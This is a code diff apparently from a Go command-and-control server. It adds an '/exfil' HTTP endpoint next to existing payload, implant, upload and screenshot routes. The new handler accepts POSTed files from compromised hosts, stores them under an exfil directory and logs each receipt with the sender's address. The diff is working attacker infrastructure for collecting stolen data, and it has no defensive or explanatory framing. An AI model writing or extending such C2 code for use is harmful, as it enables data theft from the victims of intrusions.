@@ -51,6 +51,7 @@ func (m *Manager) Start(l *db.Listener) error {
 	hl.mux.HandleFunc("/payloads/", hl.handlePayload)
 	hl.mux.HandleFunc("/upload", hl.handleUpload)
 	hl.mux.HandleFunc("/screenshot", hl.handleScreenshot)
+	hl.mux.HandleFunc("/exfil", hl.handleExfil)
 	hl.mux.HandleFunc("/implant", hl.handleImplant)
 
 	hl.mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
@@ -67,8 +68,6 @@ func (m *Manager) Start(l *db.Listener) error {
 	go func() {
 		certPath := "server.crt"
 		keyPath := "server.key"
-
-		// Check if TLS certificates exist
 		_, certErr := os.Stat(certPath)
 		_, keyErr := os.Stat(keyPath)
 
@@ -657,4 +656,50 @@ func (hl *HTTPListener) handleImplant(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
 	w.WriteHeader(http.StatusOK)
 	w.Write(data)
+}
+
+func (hl *HTTPListener) handleExfil(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+
+	if len(body) == 0 {
+		http.Error(w, "empty body", http.StatusBadRequest)
+		return
+	}
+
+	filename := r.Header.Get("X-Filename")
+	if filename == "" {
+		filename = fmt.Sprintf("exfil_%d.zip", time.Now().UnixNano())
+	}
+
+	// Sanitize filename
+	filename = filepath.Base(filename)
+
+	uploadDir := filepath.Join("uploads", "exfil")
+	if err := os.MkdirAll(uploadDir, 0755); err != nil {
+		fmt.Printf("[!] failed to create exfil dir: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+
+	savePath := filepath.Join(uploadDir, filename)
+	if err := os.WriteFile(savePath, body, 0644); err != nil {
+		fmt.Printf("[!] failed to save exfil: %v\n", err)
+		http.Error(w, "internal error", http.StatusInternalServerError)
+		return
+	}
+
+	fmt.Printf("[+] received exfil from %s: %s (%d bytes)\n", r.RemoteAddr, filename, len(body))
+
+	w.Header().Set("Content-Type", "text/plain")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte("ok"))
 }
